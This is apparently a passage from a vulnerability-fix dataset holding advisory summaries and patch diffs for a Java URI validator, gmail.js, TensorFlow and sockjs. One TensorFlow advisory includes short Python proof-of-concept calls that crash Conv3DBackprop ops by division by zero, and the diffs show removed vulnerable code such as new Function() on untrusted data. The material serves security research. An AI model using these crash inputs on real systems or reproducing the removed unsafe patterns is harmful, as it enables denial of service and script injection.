{\\n \\t\\t\\tv.error_msg(s);\\n@@ -2172,7 +2194,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"webdav:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\\n+\\t\\ts = \"webdav:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2184,13 +2206,13 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_file\");\\n \\n-\\t\\ts = \"webdav:\/\/user:pass:@machine\/the_dir\/\";\\n+\\t\\ts = \"webdav:\/\/user:pass%3A@machine\/the_dir\/\";\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n \\t\\t}\\n \\n-\\t\\ts = \"webdav: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\\n+\\t\\ts = \"webdav: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2202,7 +2224,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"webdav:\/ \/user:pass:@machine\/the_file\";\\n+\\t\\ts = \"webdav:\/ \/user:pass%3A@machine\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2214,7 +2236,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"webdav:\/ \/user:pass:@machine\";\\n+\\t\\ts = \"webdav:\/ \/user:pass%3A@machine\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2226,7 +2248,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"webdav:\/\/user:pass:@:123\/a\";\\n+\\t\\ts = \"webdav:\/\/user:pass%3A@:123\/a\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2238,7 +2260,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"webdav:\/\/user:pass:@machine:a\/the_file\";\\n+\\t\\ts = \"webdav:\/\/user:pass%3A@machine:a\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2334,7 +2356,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"WEBDAV:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\\n+\\t\\ts = \"WEBDAV:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2346,7 +2368,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_file\");\\n \\n-\\t\\ts = \"WEBDAV:\/\/user:pass:@machine\/the_dir\/\";\\n+\\t\\ts = \"WEBDAV:\/\/user:pass%3A@machine\/the_dir\/\";\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2358,7 +2380,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\\n \\n-\\t\\ts = \"WEBDAV: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\\n+\\t\\ts = \"WEBDAV: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2370,7 +2392,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"WEBDAV:\/ \/user:pass:@machine\/the_file\";\\n+\\t\\ts = \"WEBDAV:\/ \/user:pass%3A@machine\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2382,7 +2404,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"WEBDAV:\/ \/user:pass:@machine\";\\n+\\t\\ts = \"WEBDAV:\/ \/user:pass%3A@machine\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2394,7 +2416,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"WEBDAV:\/\/user:pass:@:123\/a\";\\n+\\t\\ts = \"WEBDAV:\/\/user:pass%3A@:123\/a\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2406,7 +2428,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"WEBDAV:\/\/user:pass:@machine:a\/the_file\";\\n+\\t\\ts = \"WEBDAV:\/\/user:pass%3A@machine:a\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2503,7 +2525,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"smb:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\\n+\\t\\ts = \"smb:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2515,7 +2537,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_file\");\\n \\n-\\t\\ts = \"smb:\/\/user:pass:@machine\/the_dir\/\";\\n+\\t\\ts = \"smb:\/\/user:pass%3A@machine\/the_dir\/\";\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2527,7 +2549,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\\n \\n-\\t\\ts = \"smb: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\\n+\\t\\ts = \"smb: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2539,7 +2561,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"smb:\/ \/user:pass:@machine\/the_file\";\\n+\\t\\ts = \"smb:\/ \/user:pass%3A@machine\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2551,7 +2573,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"smb:\/ \/user:pass:@machine\";\\n+\\t\\ts = \"smb:\/ \/user:pass%3A@machine\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2563,7 +2585,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"smb:\/\/user:pass:@:123\/a\";\\n+\\t\\ts = \"smb:\/\/user:pass%3A@:123\/a\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2575,7 +2597,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"smb:\/\/user:pass:@machine:a\/the_file\";\\n+\\t\\ts = \"smb:\/\/user:pass%3A@machine:a\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2671,7 +2693,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"SMB:\/\/user:pass:@machine\/the_file\"; \/\/can \":\" be part of a password?\\n+\\t\\ts = \"SMB:\/\/user:pass%3A@machine\/the_file\"; \/\/if \":\" is part of a password, it must be encoded (: -> %3A)\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2683,7 +2705,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_file\");\\n \\n-\\t\\ts = \"SMB:\/\/user:pass:@machine\/the_dir\/\";\\n+\\t\\ts = \"SMB:\/\/user:pass%3A@machine\/the_dir\/\";\\n \\n \\t\\tif (!v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2695,7 +2717,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertEquals(v.getFile(), \"\/the_dir\/\");\\n \\n-\\t\\ts = \"SMB: \/\/user:pass:@machine\/the_file\"; \/\/failure tests\\n+\\t\\ts = \"SMB: \/\/user:pass%3A@machine\/the_file\"; \/\/failure tests\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2707,7 +2729,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"SMB:\/ \/user:pass:@machine\/the_file\";\\n+\\t\\ts = \"SMB:\/ \/user:pass%3A@machine\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2719,7 +2741,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"SMB:\/ \/user:pass:@machine\";\\n+\\t\\ts = \"SMB:\/ \/user:pass%3A@machine\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2731,7 +2753,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"SMB:\/\/user:pass:@:123\/a\";\\n+\\t\\ts = \"SMB:\/\/user:pass%3A@:123\/a\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);\\n@@ -2743,7 +2765,7 @@ public static void main(String[] args) {\\n \\t\\tv.assertNull(v.getPort());\\n \\t\\tv.assertNull(v.getFile());\\n \\n-\\t\\ts = \"SMB:\/\/user:pass:@machine:a\/the_file\";\\n+\\t\\ts = \"SMB:\/\/user:pass%3A@machine:a\/the_file\";\\n \\n \\t\\tif (v.isValid(s)) {\\n \\t\\t\\tv.error_msg(s);'}}","message_norm":"incorporated yeting li's fix for potential regex denial of service (redos), see https:\/\/github.com\/fracpete\/vfsjfilechooser2\/issues\/7\npasswords can now also contain special characters (eg :), which have to be url encoded (ie %3a)","language":"en","entities":"[('denial of service', 'SECWORD', ''), ('redos', 'SECWORD', ''), ('https:\/\/github.com\/fracpete\/vfsjfilechooser2\/issues\/7', 'URL', ''), ('passwords', 'SECWORD', ''), ('encoded', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/main\/java\/com\/googlecode\/vfsjfilechooser2\/utils\/VFSURIValidator.java'])","num_files":1.0},{"index":1508,"vuln_id":"GHSA-c7pp-g2v2-2766","cwe_id":"{'CWE-79'}","score":0.0,"chain":"{'https:\/\/github.com\/KartikTalwar\/gmail.js\/commit\/a83436f499f9c01b04280af945a5a81137b6baf1'}","dataset":"osv","summary":"DOM-based XSS in gmail-js Affected versions of `gmail-js` are vulnerable to cross-site scripting in the `tools.parse_response`, `helper.get.visible_emails_post`, and `helper.get.email_data_post` functions, which pass user input directly into the Function constructor.\n\n\n\n## Recommendation\n\nUpdate to version 0.6.5 or later.","published_date":"2020-09-01","chain_len":1,"project":"https:\/\/github.com\/KartikTalwar\/gmail.js","commit_href":"https:\/\/github.com\/KartikTalwar\/gmail.js\/commit\/a83436f499f9c01b04280af945a5a81137b6baf1","commit_sha":"a83436f499f9c01b04280af945a5a81137b6baf1","patch":"SINGLE","chain_ord":"['a83436f499f9c01b04280af945a5a81137b6baf1']","before_first_fix_commit":"{'0e4732cb6c6c447d7f0487580ad7ada33184be92'}","last_fix_commit":"a83436f499f9c01b04280af945a5a81137b6baf1","chain_ord_pos":1.0,"commit_datetime":"11\/29\/2016, 08:36:02","message":"Replace new Function() with JSON.parse()","author":"Jostein Kj\u00f8nigsen","comments":null,"stats":"{'additions': 8, 'deletions': 15, 'total': 23}","files":"{'src\/gmail.js': {'additions': 8, 'deletions': 15, 'changes': 23, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/KartikTalwar\/gmail.js\/raw\/a83436f499f9c01b04280af945a5a81137b6baf1\/src%2Fgmail.js', 'patch': '@@ -891,10 +891,8 @@ var Gmail_ = function(localJQuery) {\\n                 endIndex = (parseInt(dataLength, 10) - 2) + response.indexOf(\"[\");\\n                 data = response.substring(response.indexOf(\"[\"), endIndex);\\n \\n-                var get_data = new Function(\"\\\\\"use strict\\\\\"; return \" + data);\\n-                realData = get_data();\\n-\\n-                parsedResponse.push(realData);\\n+                var json = JSON.parse(data);\\n+                parsedResponse.push(json);\\n \\n                 \/\/ prepare response for next loop\\n                 response = response.substring(response.indexOf(\"[\"), response.length);\\n@@ -1684,11 +1682,9 @@ var Gmail_ = function(localJQuery) {\\n             return emails;\\n         }\\n \\n-        get_data = get_data.substring(get_data.indexOf(\"[\"), get_data.length);\\n-        get_data = \"\\\\\"use strict\\\\\"; return \" + get_data;\\n-        get_data = new Function(get_data);\\n-\\n-        api.tracker.view_data = get_data();\\n+        var data = get_data.substring(get_data.indexOf(\"[\"), get_data.length);\\n+        var json = JSON.parse(data);\\n+        api.tracker.view_data = json;\\n \\n         for(var i in api.tracker.view_data) {\\n             if (typeof(api.tracker.view_data[i]) === \"function\") {\\n@@ -1934,13 +1930,10 @@ var Gmail_ = function(localJQuery) {\\n         if (!get_data) {\\n             return {};\\n         }\\n-        get_data = get_data.substring(get_data.indexOf(\"[\"), get_data.length);\\n-        get_data = \"\\\\\"use strict\\\\\"; return \" + get_data;\\n-        get_data = new Function(get_data);\\n-\\n-        var cdata = get_data();\\n+        var data = get_data.substring(get_data.indexOf(\"[\"), get_data.length);\\n+        var json = JSON.parse(data);\\n \\n-        api.tracker.email_data = cdata[0];\\n+        api.tracker.email_data = json[0];\\n         return api.tools.parse_email_data(api.tracker.email_data);\\n     };'}}","message_norm":"replace new function() with json.parse()","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/gmail.js'])","num_files":1.0},{"index":1518,"vuln_id":"GHSA-c94w-c95p-phf8","cwe_id":"{'CWE-190'}","score":6.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/fcd18ce3101f245b083b30655c27b239dc72221e'}","dataset":"osv","summary":"Integer overflow in Tensorflow ### Impact\nThe [implementation of `OpLevelCostEstimator::CalculateTensorSize`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/grappler\/costs\/op_level_cost_estimator.cc#L1552-L1558) is vulnerable to an integer overflow if an attacker can create an operation which would involve a tensor with large enough number of elements:\n```cc\nint64_t OpLevelCostEstimator::CalculateTensorSize(\n    const OpInfo::TensorProperties& tensor, bool* found_unknown_shapes) {\n  int64_t count = CalculateTensorElementCount(tensor, found_unknown_shapes);\n  int size = DataTypeSize(BaseType(tensor.dtype()));\n  VLOG(2) << \"Count: \" << count << \" DataTypeSize: \" << size;\n  return count * size;\n}\n```\nHere, `count` and `size` can be large enough to cause `count * size` to overflow.\n\n### Patches\nWe have patched the issue in GitHub commit [fcd18ce3101f245b083b30655c27b239dc72221e](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/fcd18ce3101f245b083b30655c27b239dc72221e).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-10","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/fcd18ce3101f245b083b30655c27b239dc72221e","commit_sha":"fcd18ce3101f245b083b30655c27b239dc72221e","patch":"SINGLE","chain_ord":"['fcd18ce3101f245b083b30655c27b239dc72221e']","before_first_fix_commit":"{'29e899868d77d8f575907515acefa012c5574246'}","last_fix_commit":"fcd18ce3101f245b083b30655c27b239dc72221e","chain_ord_pos":1.0,"commit_datetime":"11\/09\/2021, 22:54:52","message":"Prevent integer overflow in `OpLevelCostEstimator::CalculateTensorSize`.\n\nIn order to not change the API, we return a negative value in case of overflow. A better fix is to change the API to return a status instead.\n\nPiperOrigin-RevId: 408713061\nChange-Id: I3771475b0c72a2844a3854086966562fd33f2da5","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 7, 'deletions': 1, 'total': 8}","files":"{'tensorflow\/core\/grappler\/costs\/op_level_cost_estimator.cc': {'additions': 7, 'deletions': 1, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/fcd18ce3101f245b083b30655c27b239dc72221e\/tensorflow%2Fcore%2Fgrappler%2Fcosts%2Fop_level_cost_estimator.cc', 'patch': '@@ -1555,7 +1555,13 @@ int64_t OpLevelCostEstimator::CalculateTensorSize(\\n   int64_t count = CalculateTensorElementCount(tensor, found_unknown_shapes);\\n   int size = DataTypeSize(BaseType(tensor.dtype()));\\n   VLOG(2) << \"Count: \" << count << \" DataTypeSize: \" << size;\\n-  return count * size;\\n+  int64_t tensor_size = MultiplyWithoutOverflow(count, size);\\n+  if (tensor_size < 0) {\\n+    VLOG(1) << \"Overflow encountered when computing tensor size, multiplying \"\\n+            << count << \" with \" << size;\\n+    return -1;\\n+  }\\n+  return tensor_size;\\n }\\n \\n int64_t OpLevelCostEstimator::CalculateInputSize(const OpInfo& op_info,'}}","message_norm":"prevent integer overflow in `oplevelcostestimator::calculatetensorsize`.\n\nin order to not change the api, we return a negative value in case of overflow. a better fix is to change the api to return a status instead.\n\npiperorigin-revid: 408713061\nchange-id: i3771475b0c72a2844a3854086966562fd33f2da5","language":"en","entities":"[('prevent', 'ACTION', ''), ('integer overflow', 'SECWORD', ''), ('change', 'ACTION', ''), ('overflow', 'SECWORD', ''), ('change', 'ACTION', ''), ('408713061', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/grappler\/costs\/op_level_cost_estimator.cc'])","num_files":1.0},{"index":1519,"vuln_id":"GHSA-c968-pq7h-7fxv","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/311403edbc9816df80274bd1ea8b3c0c0f22c3fa'}","dataset":"osv","summary":"Division by 0 in `Conv3DBackprop*` ### Impact\nThe `tf.raw_ops.Conv3DBackprop*` operations fail to validate that the input tensors are not empty. In turn, this would result in a division by 0:\n\n```python\nimport tensorflow as tf\n\ninput_sizes = tf.constant([0, 0, 0, 0, 0], shape=[5], dtype=tf.int32)\nfilter_tensor = tf.constant([], shape=[0, 0, 0, 1, 0], dtype=tf.float32)\nout_backprop = tf.constant([], shape=[0, 0, 0, 0, 0], dtype=tf.float32)\n                            \ntf.raw_ops.Conv3DBackpropInputV2(input_sizes=input_sizes, filter=filter_tensor, out_backprop=out_backprop, strides=[1, 1, 1, 1, 1], padding='SAME', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])\n```\n```python\nimport tensorflow as tf\n\ninput_sizes = tf.constant([1], shape=[1, 1, 1, 1, 1], dtype=tf.float32)\nfilter_tensor = tf.constant([0, 0, 0, 1, 0], shape=[5], dtype=tf.int32)\nout_backprop = tf.constant([], shape=[1, 1, 1, 1, 0], dtype=tf.float32)\n\ntf.raw_ops.Conv3DBackpropFilterV2(input=input_sizes, filter_sizes=filter_tensor, out_backprop=out_backprop, strides=[1, 1, 1, 1, 1], padding='SAME', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])\n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a91bb59769f19146d5a0c20060244378e878f140\/tensorflow\/core\/kernels\/conv_grad_ops_3d.cc#L430-L450) does not check that the divisor used in computing the shard size is not zero:\n\n```cc\n  const int64 size_A = output_image_size * dims.out_depth;\n  const int64 size_B = filter_total_size * dims.out_depth;\n  const int64 size_C = output_image_size * filter_total_size;\n  const int64 work_unit_size = size_A + size_B + size_C;\n  ...\n  const size_t shard_size =\n      use_parallel_contraction\n        ? 1\n        : (target_working_set_size + work_unit_size - 1) \/ work_unit_size;\n```\n\nThus, if attacker controls the input sizes, they can trigger a denial of service via a division by zero error.\n\n### Patches\nWe have patched the issue in GitHub commit [311403edbc9816df80274bd1ea8b3c0c0f22c3fa](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/311403edbc9816df80274bd1ea8b3c0c0f22c3fa).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/311403edbc9816df80274bd1ea8b3c0c0f22c3fa","commit_sha":"311403edbc9816df80274bd1ea8b3c0c0f22c3fa","patch":"SINGLE","chain_ord":"['311403edbc9816df80274bd1ea8b3c0c0f22c3fa']","before_first_fix_commit":"{'a91bb59769f19146d5a0c20060244378e878f140'}","last_fix_commit":"311403edbc9816df80274bd1ea8b3c0c0f22c3fa","chain_ord_pos":1.0,"commit_datetime":"04\/19\/2021, 23:00:40","message":"Eliminate a division by 0 in 3D convolutions.\n\nAlso prevent a CHECK failed introduced in the most recent change.\n\nPiperOrigin-RevId: 369322073\nChange-Id: I4f609c028f89565fb2b49c3fdd20b63496582bae","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 42, 'deletions': 0, 'total': 42}","files":"{'tensorflow\/core\/kernels\/conv_grad_ops_3d.cc': {'additions': 42, 'deletions': 0, 'changes': 42, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/311403edbc9816df80274bd1ea8b3c0c0f22c3fa\/tensorflow%2Fcore%2Fkernels%2Fconv_grad_ops_3d.cc', 'patch': '@@ -239,6 +239,14 @@ class Conv3DBackpropInputOp : public OpKernel {\\n       input_shape = context->input(0).shape();\\n     }\\n \\n+    OP_REQUIRES(context, input_shape.dims() == 5,\\n+                errors::InvalidArgument(\"input tensor must have 5 dimensions\"));\\n+    OP_REQUIRES(\\n+        context, filter_shape.dims() == 5,\\n+        errors::InvalidArgument(\"filter_sizes tensor must have 5 dimensions\"));\\n+    OP_REQUIRES(\\n+        context, out_backprop_shape.dims() == 5,\\n+        errors::InvalidArgument(\"out_backprop tensor must have 5 dimensions\"));\\n     OP_REQUIRES(\\n         context, input_shape.dim_size(4) == filter_shape.dim_size(3),\\n         errors::InvalidArgument(\"input and filter_sizes must have the same \"\\n@@ -360,6 +368,14 @@ class Conv3DCustomBackpropInputOp : public OpKernel {\\n       input_shape = context->input(0).shape();\\n     }\\n \\n+    OP_REQUIRES(context, input_shape.dims() == 5,\\n+                errors::InvalidArgument(\"input tensor must have 5 dimensions\"));\\n+    OP_REQUIRES(\\n+        context, filter_shape.dims() == 5,\\n+        errors::InvalidArgument(\"filter_sizes tensor must have 5 dimensions\"));\\n+    OP_REQUIRES(\\n+        context, out_backprop_shape.dims() == 5,\\n+        errors::InvalidArgument(\"out_backprop tensor must have 5 dimensions\"));\\n     OP_REQUIRES(\\n         context, input_shape.dim_size(4) == filter_shape.dim_size(3),\\n         errors::InvalidArgument(\"input and filter_sizes must have the same \"\\n@@ -444,6 +460,11 @@ class Conv3DCustomBackpropInputOp : public OpKernel {\\n     \/\/ contraction compared to sharding and matmuls.\\n     const bool use_parallel_contraction = dims.batch_size == 1;\\n \\n+    OP_REQUIRES(\\n+        context, work_unit_size > 0,\\n+        errors::InvalidArgument(\"input, filter_sizes and out_backprop tensors \"\\n+                                \"must all have at least 1 element\"));\\n+\\n     const size_t shard_size =\\n         use_parallel_contraction\\n             ? 1\\n@@ -724,6 +745,14 @@ class Conv3DBackpropFilterOp : public OpKernel {\\n       filter_shape = context->input(1).shape();\\n     }\\n \\n+    OP_REQUIRES(context, input_shape.dims() == 5,\\n+                errors::InvalidArgument(\"input tensor must have 5 dimensions\"));\\n+    OP_REQUIRES(\\n+        context, filter_shape.dims() == 5,\\n+        errors::InvalidArgument(\"filter_sizes tensor must have 5 dimensions\"));\\n+    OP_REQUIRES(\\n+        context, out_backprop_shape.dims() == 5,\\n+        errors::InvalidArgument(\"out_backprop tensor must have 5 dimensions\"));\\n     OP_REQUIRES(\\n         context, input_shape.dim_size(4) == filter_shape.dim_size(3),\\n         errors::InvalidArgument(\"input and filter_sizes must have the same \"\\n@@ -850,6 +879,14 @@ class Conv3DCustomBackpropFilterOp : public OpKernel {\\n       filter_shape = context->input(1).shape();\\n     }\\n \\n+    OP_REQUIRES(context, input_shape.dims() == 5,\\n+                errors::InvalidArgument(\"input tensor must have 5 dimensions\"));\\n+    OP_REQUIRES(\\n+        context, filter_shape.dims() == 5,\\n+        errors::InvalidArgument(\"filter_sizes tensor must have 5 dimensions\"));\\n+    OP_REQUIRES(\\n+        context, out_backprop_shape.dims() == 5,\\n+        errors::InvalidArgument(\"out_backprop tensor must have 5 dimensions\"));\\n     OP_REQUIRES(\\n         context, input_shape.dim_size(4) == filter_shape.dim_size(3),\\n         errors::InvalidArgument(\"input and filter_sizes must have the same \"\\n@@ -936,6 +973,11 @@ class Conv3DCustomBackpropFilterOp : public OpKernel {\\n \\n     const int64 work_unit_size = size_A + size_B + size_C;\\n \\n+    OP_REQUIRES(\\n+        context, work_unit_size > 0,\\n+        errors::InvalidArgument(\"input, filter_sizes and out_backprop tensors \"\\n+                                \"must all have at least 1 element\"));\\n+\\n     const size_t shard_size =\\n         (target_working_set_size + work_unit_size - 1) \/ work_unit_size;'}}","message_norm":"eliminate a division by 0 in 3d convolutions.\n\nalso prevent a check failed introduced in the most recent change.\n\npiperorigin-revid: 369322073\nchange-id: i4f609c028f89565fb2b49c3fdd20b63496582bae","language":"en","entities":"[('division by 0', 'SECWORD', ''), ('prevent', 'ACTION', ''), ('369322073', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/conv_grad_ops_3d.cc'])","num_files":1.0},{"index":1522,"vuln_id":"GHSA-c9g6-9335-x697","cwe_id":"{'CWE-20'}","score":5.3,"chain":"{'https:\/\/github.com\/sockjs\/sockjs-node\/commit\/dd7e642cd69ee74385825816d30642c43e051d16'}","dataset":"osv","summary":"Improper Input Validation in SocksJS-Node Incorrect handling of Upgrade header with the value websocket leads in crashing of containers hosting sockjs apps. This affects the package sockjs before 0.3.20.","published_date":"2021-04-13","chain_len":1,"project":"https:\/\/github.com\/sockjs\/sockjs-node","commit_href":"https:\/\/github.com\/sockjs\/sockjs-node\/commit\/dd7e642cd69ee74385825816d30642c43e051d16","commit_sha":"dd7e642cd69ee74385825816d30642c43e051d16","patch":"SINGLE","chain_ord":"['dd7e642cd69ee74385825816d30642c43e051d16']","before_first_fix_commit":"{'3e975c69cce21092c2ac9aa7a2f9dc40446f5ccd', '68e8fd7a92e0e73cac6894a282b6d84f33e879b3'}","last_fix_commit":"dd7e642cd69ee74385825816d30642c43e051d16","chain_ord_pos":1.0,"commit_datetime":"03\/09\/2020, 01:36:12","message":"Merge pull request #266 from cakoose\/backport-writeHead-fix\n\nwriteHead: Don't end() response","author":"Bryce Kahle","comments":null,"stats":"{'additions': 0, 'deletions': 3, 'total': 3}","files":"{'src\/webjs.coffee': {'additions': 0, 'deletions': 3, 'changes': 3, 'status': 'modified', 'raw_url': 